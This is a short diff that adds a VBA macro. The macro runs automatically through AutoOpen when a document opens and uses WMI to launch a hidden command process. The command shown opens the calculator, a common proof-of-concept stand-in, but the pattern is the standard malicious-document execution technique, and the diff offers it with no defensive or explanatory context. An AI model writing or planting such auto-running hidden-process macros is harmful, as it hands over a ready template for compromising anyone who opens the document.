@@ -1,0 +1,7 @@
+Sub AutoOpen()
+Set w = GetObject("winmgmts:\\.\root\cimv2:Win32_ProcessStartup")
+w.ShowWindow = 0
+Set p = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
+p.Create "cmd /c calc", Null, w, pid
+End Sub
+
